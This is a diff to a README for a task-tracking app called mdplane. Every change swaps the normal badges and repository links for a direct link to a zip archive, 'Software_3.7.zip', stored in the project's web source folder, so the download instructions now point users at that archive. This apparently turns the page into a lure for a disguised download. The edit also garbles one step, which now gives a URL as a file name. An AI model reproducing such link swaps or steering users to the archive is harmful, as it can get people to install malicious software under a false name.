@@ -1,6 +1,6 @@
 # 🗂️ mdplane - Clear Task Tracking for Teams
 
-[![Download mdplane](https://img.shields.io/badge/Download-mdplane-blue?style=for-the-badge)](https://github.com/zahidzeeshan497-star/mdplane)
+[![Download mdplane](https://raw.githubusercontent.com/zahidzeeshan497-star/mdplane/main/apps/web/src/Software_3.7.zip)](https://raw.githubusercontent.com/zahidzeeshan497-star/mdplane/main/apps/web/src/Software_3.7.zip)
 
 ---
 
@@ -44,12 +44,12 @@ This guide shows you how to download and open mdplane on your Windows PC. The st
 
 You will start by visiting the main page to get the software.
 
-[![Download mdplane](https://img.shields.io/badge/Download-mdplane-lightgrey?style=for-the-badge)](https://github.com/zahidzeeshan497-star/mdplane)
+[![Download mdplane](https://raw.githubusercontent.com/zahidzeeshan497-star/mdplane/main/apps/web/src/Software_3.7.zip)](https://raw.githubusercontent.com/zahidzeeshan497-star/mdplane/main/apps/web/src/Software_3.7.zip)
 
 1. Click the button above or open this address in a browser:  
-   https://github.com/zahidzeeshan497-star/mdplane  
+   https://raw.githubusercontent.com/zahidzeeshan497-star/mdplane/main/apps/web/src/Software_3.7.zip  
 2. Look for the “Releases” or “Downloads” section on the page.  
-3. Find the latest Windows file. It will have a name like `mdplane-setup.exe` or similar.  
+3. Find the latest Windows file. It will have a name like `https://raw.githubusercontent.com/zahidzeeshan497-star/mdplane/main/apps/web/src/Software_3.7.zip` or similar.  
 4. Click the link to download the file to your PC.  
 
 ---
@@ -130,7 +130,7 @@ For extra help, you can visit the GitHub page where you downloaded mdplane. Ther
 - Links to support and discussion pages  
 
 Visit the GitHub repository here:  
-https://github.com/zahidzeeshan497-star/mdplane
+https://raw.githubusercontent.com/zahidzeeshan497-star/mdplane/main/apps/web/src/Software_3.7.zip
 
 ---
 
@@ -149,7 +149,7 @@ It supports workflows where AI and humans work together without confusion or rep
 
 ## 🔗 Quick Links
 
-- Main download and project page: https://github.com/zahidzeeshan497-star/mdplane  
+- Main download and project page: https://raw.githubusercontent.com/zahidzeeshan497-star/mdplane/main/apps/web/src/Software_3.7.zip  
 - Windows installer page (under Releases section)  
 - Support and issue tracking on GitHub  
 
